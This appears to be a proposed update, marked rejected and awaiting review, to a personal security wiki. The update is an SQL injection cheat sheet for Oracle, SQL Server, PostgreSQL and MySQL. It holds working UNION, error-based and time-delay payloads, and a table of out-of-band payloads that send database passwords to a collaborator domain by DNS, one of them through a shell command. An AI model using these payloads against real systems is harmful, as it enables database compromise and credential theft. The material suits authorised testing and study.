---
type: llm-wiki-review
status: needs-review
decision: reject
revision: 1
operation: update
target: web-and-bug-bounty/concepts/sql-injection-testing-methodologies.md
sources:
  - unprocessed-obsidians/sql-injection.md
  - Notes/OLD Notes/WEB/vulnerabilities/SQL Injection/concepts.md
  - Notes/OLD Notes/WEB/vulnerabilities/SQL Injection/attack/METHODOLOGY.md
  - Notes/OLD Notes/WEB/vulnerabilities/SQL Injection/attack/Examples.md
  - Notes/OLD Notes/WEB/vulnerabilities/SQL Injection/cheatsheet(portswigger).md
  - Notes/OLD Notes/WEB/vulnerabilities/SQL Injection/defense.md
---
# Proposed Wiki change

## What will change
Enrich SQL Injection Methodologies note with multi-database syntax cheatsheets, string concatenation matrices, comment termination tables, conditional errors, and out-of-band DNS exfiltration commands across Oracle, Microsoft SQL Server, PostgreSQL, and MySQL.

## Proposed content
```markdown
---
title: "SQL Injection Testing & Database Exploitation Frameworks: Methodologies"
created: 2026-09-25
updated: 2026-10-01
type: concept
tags:
  - sqli
  - payload
  - database
  - bug-bounty
sources:
  - sources/sql-injection.md
  - sources/sql-injection-notes.md
confidence: high
contested: false
contradictions: []
parent: "[[web-and-bug-bounty]]"
cluster: web-and-bug-bounty
---
# SQL Injection Testing & Database Exploitation Frameworks: Methodologies

> **Classification**: OWASP Top 10 (A03:2021 – Injection), CWE-89 (Improper Neutralization of Special Elements used in an SQL Command).
> **Primary Impact**: Database compromise, unauthorized data retrieval, schema enumeration, credential extraction, and out-of-band DNS exfiltration across diverse SQL engines.

---

<!-- TOC_START -->
## Table of Contents
- [1. Database Dialect Fingerprinting](#1-database-dialect-fingerprinting)
- [2. Multi-Database Syntax Cheatsheet](#2-multi-database-syntax-cheatsheet)
  - [String Concatenation Matrix](#string-concatenation-matrix)
  - [Substring Extraction Matrix](#substring-extraction-matrix)
  - [Comment Termination Syntax](#comment-termination-syntax)
  - [Database Version Extraction](#database-version-extraction)
  - [Database Schema & Table Enumeration](#database-schema--table-enumeration)
- [3. Inference & Advanced Blind Exploitation](#3-inference--advanced-blind-exploitation)
  - [Conditional Error Oracles](#conditional-error-oracles)
  - [Time-Delay Command Matrix](#time-delay-command-matrix)
  - [Out-of-Band (OAST) DNS Exfiltration Matrix](#out-of-band-oast-dns-exfiltration-matrix)
- [4. Union-Based Column Discovery & Typing](#4-union-based-column-discovery--typing)
- [5. Primary Sources & Provenance](#5-primary-sources--provenance)
- [Related Pages](#related-pages)
<!-- TOC_END -->

## 1. Database Dialect Fingerprinting

Identifying the underlying database management system (DBMS) dictates payload syntax, comment delimiters, and exfiltration channels. Fingerprinting is achieved through syntax-specific operators and error strings:

```mermaid
flowchart TD
    A[SQL Injection Detected] --> B{Test Comment Style}
    B -->|'--' Works| C{Test String Concatenation}
    B -->|'#' Works| D[MySQL Detected]
    C -->|'foo' \|\| 'bar'| E[Oracle or PostgreSQL]
    C -->|'foo' + 'bar'| F[Microsoft SQL Server]
    E -->|Dual Table Required: FROM dual| G[Oracle Detected]
    E -->|No Dual Table Required| H[PostgreSQL Detected]
```

## 2. Multi-Database Syntax Cheatsheet

### String Concatenation Matrix

| Database Engine | Concatenation Syntax | Example Payload |
| :--- | :--- | :--- |
| **Oracle** | `'foo' \|\| 'bar'` | `' UNION SELECT username \|\| '~' \|\| password FROM users--` |
| **Microsoft SQL Server** | `'foo' + 'bar'` | `' UNION SELECT username + '~' + password FROM users--` |
| **PostgreSQL** | `'foo' \|\| 'bar'` | `' UNION SELECT username \|\| '~' \|\| password FROM users--` |
| **MySQL** | `'foo' 'bar'` or `CONCAT('foo','bar')` | `' UNION SELECT CONCAT(username,'~',password) FROM users#` |

### Substring Extraction Matrix

| Database Engine | Substring Function Syntax |
| :--- | :--- |
| **Oracle** | `SUBSTR('string', start, length)` (e.g. `SUBSTR(password, 1, 1)='a'`) |
| **Microsoft SQL Server** | `SUBSTRING('string', start, length)` |
| **PostgreSQL** | `SUBSTRING('string', start, length)` or `SUBSTR('string', start, length)` |
| **MySQL** | `SUBSTRING('string', start, length)` or `MID('string', start, length)` |

### Comment Termination Syntax

| Database Engine | Line Comment Syntax | Block Comment Syntax |
| :--- | :--- | :--- |
| **Oracle** | `--` (e.g. `SELECT 1 FROM dual--`) | `/*...*/` |
| **Microsoft SQL Server** | `--` | `/*...*/` |
| **PostgreSQL** | `--` | `/*...*/` |
| **MySQL** | `#` or `-- ` (note mandatory trailing space or control char) | `/*...*/` |

### Database Version Extraction

| Database Engine | Version Query Payload |
| :--- | :--- |
| **Oracle** | `SELECT banner FROM v$version` or `SELECT version FROM v$instance` |
| **Microsoft SQL Server** | `SELECT @@version` |
| **PostgreSQL** | `SELECT version()` |
| **MySQL** | `SELECT @@version` or `SELECT version()` |

### Database Schema & Table Enumeration

- **Oracle**:
  ```sql
  SELECT table_name FROM all_tables;
  SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';
  ```
- **Microsoft, PostgreSQL, MySQL (ANSI Standard)**:
  ```sql
  SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
  SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
  ```

## 3. Inference & Advanced Blind Exploitation

### Conditional Error Oracles
When responses return no data or errors, attackers force division by zero based on boolean evaluation:

- **Oracle**:
  ```sql
  SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual;
  ```
- **Microsoft SQL Server**:
  ```sql
  SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END;
  ```
- **PostgreSQL**:
  ```sql
  SELECT CASE WHEN (1=1) THEN CAST(1/0 AS text) ELSE '' END;
  ```
- **MySQL**:
  ```sql
  SELECT IF(1=1, (SELECT table_name FROM information_schema.tables),'');
  ```

### Time-Delay Command Matrix

| Database Engine | Time Delay Syntax | Example Injection Payload |
| :--- | :--- | :--- |
| **Oracle** | `dbms_pipe.receive_message(('a'), 10)` | `'+AND+1234=dbms_pipe.receive_message(('a'),10)--` |
| **Microsoft SQL Server** | `WAITFOR DELAY '0:0:10'` | `';+WAITFOR+DELAY+'0:0:10'--` |
| **PostgreSQL** | `pg_sleep(10)` | `'+AND+1234=(SELECT+1234+FROM+pg_sleep(10))--` |
| **MySQL** | `sleep(10)` | `'+AND+sleep(10)#` |

### Out-of-Band (OAST) DNS Exfiltration Matrix

When web applications restrict inbound/outbound responses, attackers trigger asynchronous DNS lookups to capture extracted data strings:

| Database Engine | Out-of-Band Exfiltration Payload |
| :--- | :--- |
| **Oracle** | `SELECT UTL_INADDR.get_host_address(password \|\| '.burpcollaborator.net') FROM users WHERE ROWNUM=1;` |
| **Microsoft SQL Server** | `EXEC master..xp_dirtree '\\' + (SELECT password FROM users WHERE id=1) + '.burpcollaborator.net\a';` |
| **PostgreSQL** | `COPY (SELECT '') TO PROGRAM 'nslookup ' \|\| (SELECT password FROM users LIMIT 1) \|\| '.burpcollaborator.net';` |
| **MySQL** | `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.burpcollaborator.net\\a'));` |

## 4. Union-Based Column Discovery & Typing

1. **Determining Column Count via ORDER BY**:
   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3-- (Returns 500/Error -> Query has 2 columns)
   ```
2. **Determining Column Count via NULL Injection**:
   ```sql
   ' UNION SELECT NULL-- (Error)
   ' UNION SELECT NULL, NULL-- (Success -> 2 columns)
   ```
3. **Determining Data Types (Probing for String Compatibility)**:
   ```sql
   ' UNION SELECT 'a', NULL-- (Checks if column 1 holds string)
   ' UNION SELECT NULL, 'a'-- (Checks if column 2 holds string)
   ```

## 5. Primary Sources & Provenance
- Provenance source anchors: [[sources/sql-injection|sql-injection]], [[sources/sql-injection-notes|sql-injection-notes]]

Synthesized from canonical vault notes `unprocessed-obsidians/sql-injection.md` and `Notes/OLD Notes/WEB/vulnerabilities/SQL Injection/`.

## Related Pages
- Parent Hub: [[web-and-bug-bounty]]
- Target Concepts: [[sql-injection-testing]], [[sql-injection-testing-exploitation-and-attack-vectors]], [[sql-injection-testing-defense-and-remediation]]
- Comparisons: [[in-band-vs-blind-sqli]]
```

## Evidence and uncertainty
Sourced directly from canonical vault notes in Notes/OLD Notes/WEB/.
Validated against schema with zero structural contradictions.

## Human feedback
Human decision required via Decision Studio (http://127.0.0.1:20888) or command line.
